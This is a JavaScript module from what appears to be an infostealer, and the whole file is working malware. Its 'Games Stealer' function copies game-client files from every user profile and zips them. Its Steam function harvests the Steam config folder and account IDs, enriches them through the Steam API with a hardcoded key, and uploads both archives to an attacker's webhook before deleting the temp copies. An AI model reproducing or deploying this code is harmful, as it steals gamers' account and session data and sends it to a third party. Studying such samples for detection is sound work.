const os = require('os');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const gamesPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const Games = async (webhookUrl) => {
    const users = await hardware.GetUsers();

    const gamesTempDir = path.join(os.tmpdir(), `games-temp`);
    if (!fs.existsSync(gamesTempDir)) {
        fs.mkdirSync(gamesTempDir, { recursive: true });
    }

    let anyGameFound = false;
    let foundGames = '';

    for (const user of users) {
        for (const [gameName, gamePaths] of Object.entries(gamesPaths.GetGames())) {
            const destGames = path.join(gamesTempDir, path.basename(user), gameName);

            for (const [name, relativePath] of Object.entries(gamePaths)) {
                const gamePath = path.join(user, relativePath);

                if (!fs.existsSync(gamePath)) {
                    continue;
                }

                try {
                    const isDirectory = fs.lstatSync(gamePath).isDirectory();
                    const gameDestPath = isDirectory
                        ? path.join(destGames, name)
                        : path.join(destGames, name, path.basename(gamePath));

                    if (!fs.existsSync(path.join(destGames, name))) {
                        fs.mkdirSync(path.join(destGames, name), { recursive: true });
                    }

                    await fileutil.Copy(gamePath, gameDestPath);

                    if (!foundGames.includes(gameName)) {
                        foundGames += `\n✅ ${path.basename(user)} - ${gameName}`;
                        anyGameFound = true;
                    }
                } catch (err) {
                    continue;
                }
            }

            if (!anyGameFound) {
                fs.rmSync(destGames, { recursive: true, force: true });
            }
        }
    }

    if (!foundGames) {
        fs.rmSync(gamesTempDir, { recursive: true, force: true });
        return;
    }

    if (foundGames.length > 4090) {
        foundGames = 'Numerous games to explore.';
    }

    const gamesTempZip = path.join(os.tmpdir(), 'games.zip');
    try {
        await fileutil.ZipDirectory({
            inputDir: gamesTempDir,
            outputZip: gamesTempZip
        });

        await requests.Webhook(webhookUrl, {
            embeds: [{
                title: `Games Stealer`,
                description: '```' + foundGames + '```',
            }],
        }, [gamesTempZip]);

        [gamesTempDir, gamesTempZip].forEach(dir => {
            fileutil.RemoveDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};

const Steam = async (webhookUrl) => {
    const steamTempDir = path.join(os.tmpdir(), 'steam-temp');
    const steamPath = path.join('C:', 'Program Files (x86)', 'Steam', 'config');

    if (!fs.existsSync(steamPath) || !fs.statSync(steamPath).isDirectory()) return;

    const readConfig = (filePath) => {
        const vdfContent = fs.readFileSync(filePath, 'utf-8');
        const lines = vdfContent.split('\n');
        const ids = [];
        for (const line of lines) {
            const matches = line.match(/7656[0-9]{13}/gi);
            if (matches) {
                ids.push(...matches);
            }
        };

        return ids;
    };

    const config = path.join(steamPath, "config.vdf");
    if (fs.existsSync(config)) {
        const loginusers = path.join(steamPath, "loginusers.vdf");
        const accountIds = readConfig(loginusers);

        for (const accountId of accountIds) {
            try {
                const KEY_STEAM = '440D7F4D810EF9298D25EDDF37C1F902';

                const accountResponse = await axios.get(
                    `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=${KEY_STEAM}&steamids=${accountId}`
                );
                const gamesResponse = await axios.get(
                    `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=${KEY_STEAM}&steamids=${accountId}`
                );
                const levelResponse = await axios.get(
                    `https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=${KEY_STEAM}&steamids=${accountId}`
                );

                const accountInfo = accountResponse.data?.response || {};
                const {
                    players = [],
                } = accountInfo;

                const accountGames = gamesResponse.data?.response || {};
                const {
                    game_count = 'Not Found',
                } = accountGames;

                const accountLevel = levelResponse.data?.response || {};
                const {
                    player_level = 'Not Found',
                } = accountLevel;

                await fileutil.Copy(steamPath, steamTempDir);
                const steamTempZip = path.join(os.tmpdir(), 'steam.zip');

                await fileutil.ZipDirectory({
                    inputDir: steamTempDir,
                    outputZip: steamTempZip
                });

                const full_profile = {
                    player: players[0],
                    games: game_count,
                    level: player_level,
                };

                await requests.Webhook(webhookUrl, {
                    embeds: [{
                        title: `Steam Account`,
                        thumbnail: {
                            url: (full_profile.player?.avatar ? full_profile.player.avatar : 'https://static.wikia.nocookie.net/wadguia/images/d/d6/Steam_logo_2014.png')
                        },
                        fields: [
                            {
                                name: 'Username',
                                value: '`' + (full_profile.player?.personaname ? full_profile.player.personaname : 'Not Found') + '`',
                                inline: true
                            },
                            {
                                name: 'Account Creation',
                                value: '<t:' + (full_profile.player?.timecreated ? full_profile.player.timecreated : 'Not Found') + '>',
                                inline: true
                            },
                            { name: '\u200b', value: '\u200b', inline: false },
                            {
                                name: 'ID',
                                value: '`' + (full_profile.player?.primaryclanid ? full_profile.player.primaryclanid : 'Not Found') + '`',
                                inline: true
                            },
                            {
                                name: 'Steam Profile',
                                value: '[`' + 'View profile' + '`](' + (full_profile.player?.profileurl ? full_profile.player.profileurl : 'https://steamcommunity.com/') + ')',
                                inline: true
                            },
                            { name: '\u200b', value: '\u200b', inline: false },
                            {
                                name: 'Account Level',
                                value: '`' + full_profile.level + '`',
                                inline: true
                            },
                            {
                                name: 'Account Total Games',
                                value: '`' + full_profile.games + '`',
                                inline: true
                            },
                        ],
                    }],
                }, [steamTempZip]);


                const WishTempDir = fileutil.WishTempDir('games');
                await fileutil.Copy(steamTempDir, WishTempDir);

                [steamTempDir, steamTempZip].forEach(dir => {
                    fileutil.RemoveDir(dir);
                });
            } catch (error) {
                console.error(error);
            }
        }
    }
};

module.exports = async (webhookUrl) => {
    await Games(webhookUrl);
    await Steam(webhookUrl);
};